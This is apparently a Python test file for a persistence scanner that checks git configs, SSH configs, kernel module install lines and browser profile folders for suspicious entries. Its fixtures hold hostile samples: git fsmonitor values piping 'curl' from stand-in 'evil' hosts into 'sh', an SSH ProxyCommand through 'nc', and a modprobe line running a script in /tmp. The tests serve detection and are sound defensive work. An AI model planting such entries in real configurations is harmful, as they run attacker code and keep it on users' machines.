# Run: python3 tests/test_persistence.py (or pytest)
import atexit, os, shutil, sys, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from arche.persistence import hooks, chromium_roots, install_cmds, git_runs


def test_hooks():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
    try:
        with open(f'{home}/.gitconfig', 'w') as f:
            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n')
        os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global')]
    finally: os.environ.clear(); os.environ.update(old)
    assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
    assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows



def test_custom_chromium_dirs():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    for d in ('.config/brave-vault/Default', '.config/Code', '.var/app/x.y/config/work/Profile 2'): os.makedirs(f'{home}/{d}')
    for f in ('.config/brave-vault/Local State', '.config/brave-vault/Default/Preferences', '.config/Code/Local State',
              '.config/Code/Preferences', '.var/app/x.y/config/work/Local State', '.var/app/x.y/config/work/Profile 2/Preferences'):
        open(f'{home}/{f}', 'w').write('{}')
    os.environ['HOME'] = home
    try: extra = [(n, r.replace(home, '~')) for n, r in chromium_roots() if r.startswith(home)]
    finally: os.environ.clear(); os.environ.update(old)
    assert extra == [('brave-vault', '~/.config/brave-vault'), ('work', '~/.var/app/x.y/config/work')], extra   # not the Electron app



def test_install_cmds():
    t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
         'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
         'install e1000e /tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e\nblacklist nouveau\n')
    assert list(install_cmds(t)) == [('e1000e', '/tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e')], list(install_cmds(t))


def test_git_runs():
    l = ('core.fsmonitor=true\ncore.fsmonitor=.git/hooks/fsmonitor-watchman\nfilter.lfs.smudge=git-lfs smudge -- %f\n'
         'filter.x.smudge=./x.sh\ndiff.pdf.textconv=pdftotext\nalias.st=status\nalias.y=!sh y\nremote.origin.url=https://x\n')
    assert [k for k, _ in git_runs(l)] == ['core.fsmonitor', 'filter.x.smudge', 'diff.pdf.textconv', 'alias.y']


def test_repo_git_folder():
    import arche.ai
    r, old = tempfile.mkdtemp(), arche.ai.repos; atexit.register(shutil.rmtree, r, True)
    os.makedirs(f'{r}/.git/hooks')
    open(f'{r}/.git/config', 'w').write('[core]\n\tfsmonitor = "curl -s https://evil.example/x | sh"\n\tsshCommand = ssh -i ~/.ssh/deploy\n')
    open(f'{r}/.git/hooks/post-checkout', 'w').write('#!/bin/sh\necho hi\n'); os.chmod(f'{r}/.git/hooks/post-checkout', 0o755)
    open(f'{r}/.git/hooks/pre-commit.sample', 'w').write('#!/bin/sh\n'); os.chmod(f'{r}/.git/hooks/pre-commit.sample', 0o755)
    arche.ai.repos = lambda: [r]
    try: rows = [(t, s) for t, s, _ in hooks() if r in t]
    finally: arche.ai.repos = old
    assert [s for _, s in rows] == [1, 0, 0] and 'evil.example' in rows[0][0] and 'post-checkout' in rows[2][0], rows


if __name__ == '__main__':
    test_hooks(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_install_cmds(); print('ok')
